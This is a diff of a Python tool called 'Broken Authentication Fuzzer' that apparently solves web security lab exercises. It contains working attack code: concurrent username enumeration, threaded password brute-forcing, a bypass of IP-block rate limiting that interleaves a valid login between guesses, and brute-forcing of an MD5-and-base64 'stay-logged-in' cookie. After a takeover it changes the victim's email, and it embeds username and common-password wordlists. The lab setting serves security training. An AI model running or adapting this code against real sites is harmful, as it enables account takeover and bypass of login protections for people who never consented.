@@ -28,7 +28,7 @@ ________________________________________________________________________________
 
 stop_event   = threading.Event()
 stop_P_event = threading.Event()
-stop_T_event = threading.Event()
+stop_S_event = threading.Event()
 # --------------------------------------Functions-----------------------------------------------------
 
 def print_execution_time(func):
@@ -99,7 +99,6 @@ def concurrent_username_enum(session,url,usernames,error_message) :
         except Exception as e:
             print(f"[-] Error during username enumeration: {str(e)}")
 
-
 def password_bruteforce(session, url, username, password, stop_P_event):
     
     if stop_P_event.is_set():
@@ -132,7 +131,7 @@ def password_bruteforce(session, url, username, password, stop_P_event):
         print(f"[-] Error: {e}")
         sys.exit(1)
 
-
+@print_execution_time
 def concurrent_password_bruteforce(session,url,valid_user,passwords) : 
 
     with ThreadPoolExecutor(max_workers=20) as executor:
@@ -202,28 +201,25 @@ def Broken_Reset_flaw (session,url) :
         print("(-) Failed  -> Your Request isn't Correct.")
         sys.exit(-1)
 
-  
+
 @print_execution_time
 def ip_block(session,url,passwords) :
-    user_pass = dict() 
-    
-    for i in range (len(passwords) ) :
-        if i % 3 :
-            user_pass['username'] = "carlos"
-            user_pass['password'] = passwords[i]
 
-        else:
-            user_pass['username'] = "wiener"
-            user_pass['password'] = "peter"
+    for i, pwd in enumerate(passwords):
+
+        username = "carlos"
+
+        if i % 3 == 0 :
+            username = "wiener"
 
         try:
             r = session.post(
                 url + "/login",
                 headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'},
-                data={'username': user_pass['username'], 'password': user_pass["password"] },
+                data={'username': username, 'password': pwd },
                 timeout=10,
                 verify=False)
-        
+            
             
             soup = BeautifulSoup(r.content, 'html.parser')
             msg_element = soup.find('p', class_='is-warning')
@@ -231,17 +227,19 @@ def ip_block(session,url,passwords) :
             if msg_element:
                 msg = msg_element.getText()
                 if msg == 'Incorrect password':
-                    print(f"[-] Trying ----> {user_pass['username']}:{user_pass["password"]}.")
+                    print(f"[-] Trying ----> {username}:{pwd}.")
 
                 else:
                     print(msg)
-            elif user_pass['username'] == "wiener": 
-                print(f"[*] Logged in Using  {user_pass['username']}'s Account to reset the Rate Limiting Mechanism.")
-            elif user_pass['username'] == 'carlos' : 
+            elif username == "wiener": 
+                print(f"[*] Logged in Using  {username}'s Account to reset the Rate Limiting Mechanism.")
+            elif username == 'carlos' : 
                 print("============="*8)
-                print(f"[+] Found carlos's Passowrd ---------> {user_pass['password']}")
-                print(f"[*] Trying To Login Using Carlos Creds {user_pass['username']}:{user_pass['password']}")
+                print(f"[+] Found carlos's Passowrd ---------> {pwd}")
+                print(f"[*] Trying To Login Using Carlos Creds {username}:{pwd}")
                 print(f"[+] Successfull Solved The Lab.✅✅")
+                session.post(url + "/my-account/change-email",data = {"email":"hacked!@x.com"} )
+                print(f"[+] Email Changed Successfull. ✅✅")
                 break
 
         except requests.exceptions.ConnectionError:
@@ -256,37 +254,39 @@ def ip_block(session,url,passwords) :
             print(f"[-] Error: {e}")
             sys.exit(1)      
 
-def Brute_force_Session(url,passwords) : 
+
+def Brute_force_Session(url,password) : 
     
-    for password in passwords : 
-        hashed_password = hashlib.md5(password.encode('utf-8')).hexdigest()
-        Session_value = f"carlos:{hashed_password}"
-        encoded_session_value = base64.b64encode(bytes(Session_value,'utf-8')).decode('utf-8')
-
-        print(f"\ntrying --------> {password} ")
-        print(f"MD5 Hasing: {hashed_password} ")
-        print(f"Session: {Session_value} ")
-        print(f"Base64 Encoded Session: {encoded_session_value} ")
-        
-        cookies = {'stay-logged-in': encoded_session_value}
-        myaccount_url = url + "/my-account"
-        response = requests.get(myaccount_url, cookies=cookies, verify=False)
-        print(f"(*) Requesting /my-account page Using The Encoded Session.")
+    if stop_event.is_set():
+        return None
     
+    hashed_password = hashlib.md5(password.encode('utf-8')).hexdigest()
+    Session_value = f"carlos:{hashed_password}"
+    encoded_session_value = base64.b64encode(bytes(Session_value,'utf-8')).decode('utf-8')
 
+    print(f"\ntrying --------> {password}\nMD5 Hasing: {hashed_password}\nSession: {Session_value}\nBase64 Encoded Session: {encoded_session_value}")
 
-        soup = BeautifulSoup(response.content, 'html.parser')
-        Button = soup.find(name='button', class_='button')
+    cookies = {'stay-logged-in': encoded_session_value}
+    myaccount_url = url + "/my-account"
+    response = requests.get(myaccount_url, cookies=cookies, verify=False)
+    
+    if stop_event.is_set():
+        return None
 
-        if Button :
-            msg = Button.get_text()
-            if msg == " Update email " :
-                print("========="*8)
-                print(f"[+] Found carlos's password: {password}")
-                print(f"[+] Carlos Session: {encoded_session_value} ")
-                break
-            else :
-                pass
+    print(f"(*) Requesting /my-account page Using The Encoded Session.")
+    soup = BeautifulSoup(response.content, 'html.parser')
+    Button = soup.find(name='button', class_='button')
+
+    if Button :
+        msg = Button.get_text()
+        if msg == " Update email " :
+            stop_event.set() 
+            print("========="*8)
+            print(f"[+] Found carlos's password: {password}")
+            print(f"[+] Carlos Session: {encoded_session_value} ")
+            return password,encoded_session_value
+        else :
+            pass
 # Main Function
 # ----------------------------
 
@@ -295,8 +295,7 @@ def main():
         description='Broken Authentication Fuzzer',
         usage='python3 %(prog)s -u <target_url> [-p PROXY]')
     parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://example.com)')
-    parser.add_argument('-p', '--proxies', nargs='?', const='127.0.0.1:8080',
-                       help='Proxy server (default: 127.0.0.1:8080)')
+    parser.add_argument('-p', '--proxies', nargs='?', const='127.0.0.1:8080', help='Proxy server (default: 127.0.0.1:8080)')
     args = parser.parse_args()
 
     # Validate and normalize URL
@@ -326,38 +325,17 @@ def main():
             print(f"[-] Error setting up proxy: {e}")
             sys.exit(1)
 
-    # Load wordlists with error handling
-    try:
-        with open('username.txt', 'r') as f:
-            usernames = [line.strip() for line in f if line.strip()]
-        if not usernames:
-            print("[-] Username file is empty or not found")
-            sys.exit(1)
-    except FileNotFoundError:
-        print("[-] username.txt file not found")
-        sys.exit(1)
-    except Exception as e:
-        print(f"[-] Error reading username.txt: {e}")
-        sys.exit(1)
-
-    try:
-        with open('passwords.txt', 'r') as f:
-            passwords = [line.strip() for line in f if line.strip()]
-        if not passwords:
-            print("[-] Password file is empty or not found")
-            sys.exit(1)
-    except FileNotFoundError:
-        print("[-] passwords.txt file not found")
-        sys.exit(1)
-    except Exception as e:
-        print(f"[-] Error reading passwords.txt: {e}")
-        sys.exit(1)
+    # Load wordlists 
+    usernames = ['carlos', 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle', 'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access', 'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion', 'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af', 'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai', 'al', 'alabama', 'alaska', 'albuquerque', 'alerts', 'alpha', 'alterwind', 'am', 'amarillo', 'americas', 'an', 'anaheim', 'analyzer', 'announce', 'announcements', 'antivirus', 'ao', 'ap', 'apache', 'apollo', 'app', 'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie', 'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at', 'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']
+    passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']
+    new_passowrds = ['peter','123456', 'password', 'peter', '12345678', 'qwerty', 'peter', '123456789', '12345', 'peter', '1234', '111111', 'peter', '1234567', 'dragon', 'peter', '123123', 'baseball', 'peter', 'abc123', 'football', 'peter', 'monkey', 'letmein', 'peter', 'shadow', 'master', 'peter', '666666', 'qwertyuiop', 'peter', '123321', 'mustang', 'peter', '1234567890', 'michael', 'peter', '654321', 'superman', 'peter', '1qaz2wsx', '7777777', 'peter', '121212', '000000', 'peter', 'qazwsx', '123qwe', 'peter', 'killer', 'trustno1', 'peter', 'jordan', 'jennifer', 'peter', 'zxcvbnm', 'asdfgh', 'peter', 'hunter', 'buster', 'peter', 'soccer', 'harley', 'peter', 'batman', 'andrew', 'peter', 'tigger', 'sunshine', 'peter', 'iloveyou', '2000', 'peter', 'charlie', 'robert', 'peter', 'thomas', 'hockey', 'peter', 'ranger', 'daniel', 'peter', 'starwars', 'klaster', 'peter', '112233', 'george', 'peter', 'computer', 'michelle', 'peter', 'jessica', 'pepper', 'peter', '1111', 'zxcvbn', 'peter', '555555', '11111111', 'peter', '131313', 'freedom', 'peter', '777777', 'pass', 'peter', 'maggie', '159753', 'peter', 'aaaaaa', 'ginger', 'peter', 'princess', 'joshua', 'peter', 'cheese', 'amanda', 'peter', 'summer', 'love', 'peter', 'ashley', 'nicole', 'peter', 'chelsea', 'biteme', 'peter', 'matthew', 'access', 'peter', 'yankees', '987654321', 'peter', 'dallas', 'austin', 'peter', 'thunder', 'taylor', 'peter', 'matrix', 'mobilemail', 'peter', 'mom', 'monitor', 'peter', 'monitoring', 'montana', 'peter', 'moon', 'moscow', 'peter']
 
     session = requests.Session()
     if proxies:
         session.proxies.update(proxies)
+        session.verify = False
 
-    error_message2 = 'Invalid username or password.'
+
     print(Logo)
 
     # Test initial connectivity
@@ -414,7 +392,7 @@ def main():
     
     elif lab_name == "Username enumeration via subtly different responses":
             print("[*] Starting username enumeration...")
-            error_message = error_message2
+            error_message = 'Invalid username or password.'
             valid_user = concurrent_username_enum(session=session,url=url,usernames=usernames,error_message=error_message) 
 
             if not valid_user:
@@ -429,11 +407,20 @@ def main():
 
     elif lab_name == "Broken brute-force protection, IP block":
         print("[*] Starting Brute-Force carlos's Password.")
-        ip_block(session,url,passwords)
+        ip_block(session,url,new_passowrds)
 
     elif lab_name == "Brute-forcing a stay-logged-in cookie" :
+        start_time = time.perf_counter()
         print("[*] Trying To Brute-force the encoded Cookie...")
-        Brute_force_Session(url,passwords)
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(Brute_force_Session,url,pwd) for pwd in passwords]
+        
+        end_time = time.perf_counter()
+        print(f"[+] Time taken: {end_time - start_time:.2f} Sec")
+
+
+        
+        # Brute_force_Session(url,passwords)
 
 
     else:
